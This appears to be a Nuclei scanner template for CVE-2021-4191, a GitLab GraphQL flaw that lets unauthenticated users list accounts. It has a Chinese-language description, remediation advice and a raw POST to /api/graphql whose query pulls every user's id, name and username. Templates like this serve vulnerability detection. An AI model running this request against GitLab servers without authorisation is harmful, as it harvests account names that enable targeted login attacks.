id: CVE-2021-4191
info:
  name: GitLab GraphQL API User Enumeration
  author:
  - l0ne1y
  tags:
  - cve
  - cve2021
  - gitlab
  - api
  - graphql
  - enum
  - unauth
  description: |-
    GitLab Enterprise Edition和GitLab Community Edition 授权问题漏洞
    GitLab Enterprise Edition是一套内容管理系统。GitLab Community Edition是美国GitLab公司的一种社区版 GitLab 。

    GitLab Enterprise Edition和GitLab Community Edition存在授权问题漏洞，该漏洞源于应用程序在GraphQL API中输出了过多的数据。远程攻击者可利用该漏洞获得对系统敏感信息的未经授权的访问。
  reference:
  - https://www.rapid7.com/blog/post/2022/03/03/cve-2021-4191-gitlab-graphql-api-user-enumeration-fixed/
  - https://thehackernews.com/2022/03/new-security-vulnerability-affects.html
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-4191
  - https://gitlab.com/gitlab-org/gitlab/-/issues/343898
  severity: medium
  classification:
    cve-id:
    - cve-2021-4191
    cwe-id:
    - cwe-287
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    http://about.gitlab.com/releases/2022/02/25/critical-security-release-gitlab-14-8-2-released/
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - '"data"'
    - '"users"'
    - '"nodes"'
    - '"id"'
    - gid://
  - type: status
    status:
    - 200
  extractors:
  - type: json
    json:
    - .data.users.nodes[].username
  matchers-condition: and
  raw:
  - |
    POST /api/graphql HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json
    Accept: */*
    Origin: {{RootURL}}
    Referer: {{RootURL}}/-/graphql-explorer

    {"query":"# Welcome to GraphiQL\n#\n# GraphiQL is an in-browser tool for writing, validating, and\n# testing GraphQL queries.\n#\n# Type queries into this side of the screen, and you will see intelligent\n# typeaheads aware of the current GraphQL type schema and live syntax and\n# validation errors highlighted within the text.\n#\n# GraphQL queries typically start with a \"{\" character. Lines that starts\n# with a # are ignored.\n#\n# An example GraphQL query might look like:\n#\n#     {\n#       field(arg: \"value\") {\n#         subField\n#       }\n#     }\n#\n# Keyboard shortcuts:\n#\n#  Prettify Query:  Shift-Ctrl-P (or press the prettify button above)\n#\n#       Run Query:  Ctrl-Enter (or press the play button above)\n#\n#   Auto Complete:  Ctrl-Space (or just start typing)\n#\n\n{\n  users {\n    nodes {\n      id\n      name\n      username\n    }\n  }\n}","variables":null,"operationName":null}
